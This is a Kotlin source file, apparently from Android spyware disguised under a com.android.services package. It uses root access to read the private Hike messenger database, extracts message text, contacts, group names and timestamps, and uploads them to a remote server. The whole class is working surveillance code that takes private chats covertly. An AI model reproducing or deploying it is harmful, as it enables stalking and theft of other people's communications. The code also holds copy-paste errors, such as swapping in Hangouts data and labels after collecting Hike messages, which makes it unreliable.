package com.android.services.logs.collectors.im

import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.text.TextUtils
import com.android.services.db.entities.HikeRooted
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerOneApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.RootPermission.setPermissionHike
import com.android.services.util.logException
import com.android.services.util.logVerbose
import java.util.*

class HikeRootedCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncHike) {
            try {
                val hikeList = retrieveHikeMessages(context, localDatabaseSource)
                if (hikeList.isNotEmpty()) {
                    val startDate = hikeList[hikeList.size - 1].date
                    val endDate = hikeList[0].date
                    val mHikeSender = RemoteServerHelper(
                        context,
                        AppConstants.HIKE_ROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startDate = startDate,
                        endDate = endDate
                    )
                    mHikeSender.upload(hikeList)
                }
            } catch (e: Exception) {
                logException(
                    "${AppConstants.HIKE_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
        } else {
            logVerbose("${AppConstants.HIKE_ROOTED_TYPE} Sync is Off")
        }
    }

    companion object {

        private const val hikeFolder = "com.hike.chat.stickers"
        private const val hikeDB = "chats"

        private fun retrieveHikeMessages(
            context: Context,
            localDatabaseSource: LocalDatabaseSource,
        ): List<HikeRooted> {
            var hikeMessages = ArrayList<HikeRooted>()
            try {
                setPermissionHike()
                val hikeDatabase = ("/data/data/"
                        + hikeFolder
                        + "/databases/"
                        + hikeDB)

                val selection: String?
                val selectionArgs: Array<String>?
                val since: String
                val maxTimeStamp = localDatabaseSource.selectHikeRootedMaxTimeStamp() ?: "0"
                since = maxTimeStamp.toString()

                if (since.isNotEmpty()) {
                    selection = String.format("%s > ?", "timestamp")
                    selectionArgs = arrayOf(since)
                } else {
                    selection = null
                    selectionArgs = null
                }

                val database =
                    SQLiteDatabase.openDatabase(hikeDatabase, null, SQLiteDatabase.OPEN_READONLY)
                val c = database.query("messages",
                    null,
                    selection,
                    selectionArgs,
                    null,
                    null,
                    "timestamp DESC")

                while (c.moveToNext()) {
                    val messageId = c.getString(c.getColumnIndex("msgid"))
                    val timeStamp = c.getString(c.getColumnIndex("timestamp"))
                    val conversationId = c.getString(c.getColumnIndex("convid"))
                    var conversationName = c.getString(c.getColumnIndex("msisdn"))
                    val metadata = c.getString(c.getColumnIndex("metadata"))
                    if (metadata.isEmpty()) {
                        val cConversations = database.query("groupInfo", arrayOf("groupName"),
                            "groupId=?", arrayOf(conversationName), null, null, null)
                        var groupName: String
                        if (cConversations != null) {
                            if (cConversations.moveToFirst()) {
                                groupName = cConversations.getString(0)
                                if (!TextUtils.isEmpty(groupName)) conversationName = groupName
                            }
                            cConversations.close()
                        }
                    }
                    val messageText = c.getString(c.getColumnIndex("message"))
                    var type: String
                    val msgStatus = c.getString(c.getColumnIndex("msgStatus"))
                    type = if (msgStatus == "5" || msgStatus == "6") {
                        "incoming"
                    } else {
                        "outgoing"
                    }
                    val msgHash = c.getString(c.getColumnIndex("msgHash"))
                    if (msgHash != null && msgHash.isNotEmpty() && msgHash.contains("_")) {
                        val msg = msgHash.split("_").toTypedArray()
                        val contactName = AppUtils.getContactName(msg[0], context)
                        conversationName = if (contactName != "Unknown") contactName else msg[0]
                    }

                    val hikeRooted = HikeRooted()
                    hikeRooted.apply {
                        this.conversationId = conversationId
                        this.conversationName = conversationName
                        this.message = AppUtils.convertStringToBase64(messageText)
                        this.type = type
                        this.messageDatetime = AppUtils.formatDate(timeStamp)
                        this.messageId = messageId
                        this.timeStamp = timeStamp.toLong()
                        this.date = AppUtils.getDate(timeStamp.toLong())
                    }
                    hikeMessages.add(hikeRooted)
                }
                c.close()
                database.close()
                logVerbose("${AppConstants.HANGOUT_ROOTED_TYPE} rooted list = $hikeMessages")
                if (hikeMessages.isNotEmpty())
                    localDatabaseSource.insertHikeRooted(hikeMessages)
                localDatabaseSource.selectHangoutRooted {
                    hikeMessages = it as ArrayList<HikeRooted>
                }
                logVerbose("${AppConstants.HANGOUT_ROOTED_TYPE} selected list = $hikeMessages")
            } catch (e: Exception) {
                logVerbose(
                    "${AppConstants.HANGOUT_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
            return hikeMessages
        }
    }
}